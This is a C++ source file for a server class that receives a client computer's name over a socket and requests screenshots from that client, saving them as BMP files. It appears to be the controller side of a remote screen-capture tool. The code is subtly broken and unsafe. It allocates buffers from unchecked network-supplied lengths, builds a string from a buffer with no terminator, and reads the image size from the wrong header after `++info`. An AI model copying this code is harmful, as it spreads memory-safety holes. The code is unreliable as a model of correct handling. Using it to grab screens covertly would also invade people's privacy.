#include "TalkToClient.h"
#include "SandRecvAll.h"

#include <fstream>
#include <format>
#include <chrono>

TalkToClient::TalkToClient(SOCKET ClientSock, std::string my_ip) : ClientSock_(ClientSock), my_ip_(my_ip)
{
	recv_name();
}

TalkToClient::~TalkToClient()
{
	closesocket(ClientSock_);
}

void TalkToClient::recv_name()
{
	union {
		int _int{0};
		char _char[4];
	} len;


	if (SandRecvAll::recv_all(ClientSock_, len._char, sizeof(len._char), 0) == -1)
	{
		throw std::string{ "disconnected" };
	}

	char* buffer = new char[len._int];
	if (SandRecvAll::recv_all(ClientSock_, buffer, len._int, 0) == -1) {
		throw std::string{ "disconnected" };
	}
	computer = std::string(buffer);
	delete[] buffer;
}

std::string TalkToClient::get_name()
{
	return my_ip_ + '/' + computer;
}

std::string TalkToClient::make_screenshot()
{
	char buf[1] = { '+' };
	if (SandRecvAll::sand_all(ClientSock_, buf, sizeof(buf), 0) == -1)
	{
		throw std::string{ "disconnected" };
	}

	union {
		int _int{ 0 };
		char _char[4];
	} len;

	if (SandRecvAll::recv_all(ClientSock_, len._char, sizeof(len._char), 0) == -1)
	{
		throw std::string{ "disconnected" };
	}

	char* image = new char[len._int];
	if (SandRecvAll::recv_all(ClientSock_, image, len._int, 0) == -1) {
		throw std::string{ "disconnected" };
	}

    
    BITMAPINFO* info = reinterpret_cast<BITMAPINFO*>(image);

    BITMAPFILEHEADER fileHeader = { 0 };
    fileHeader.bfType = 0x4D42;
    fileHeader.bfOffBits = 54;
    fileHeader.bfSize = (((info->bmiHeader.biWidth * info->bmiHeader.biBitCount + 31) & ~31) / 8
        * info->bmiHeader.biHeight) + fileHeader.bfOffBits;

    std::string path = std::format("/\"{}\"/screenshots/\"{}\".bmp", computer,
		std::chrono::system_clock::now());

    std::ofstream file(path, std::ios::out | std::ios::binary);
    if (file)
    {
        file.write(reinterpret_cast<char*>(&fileHeader), sizeof(BITMAPFILEHEADER));
        file.write(reinterpret_cast<char*>(info), sizeof(BITMAPINFOHEADER));
        file.write(reinterpret_cast<char*>(++info), info->bmiHeader.biSizeImage);
	}
	else {
		throw std::string{ "Unable to save screenshot" };
	}

	return path;
}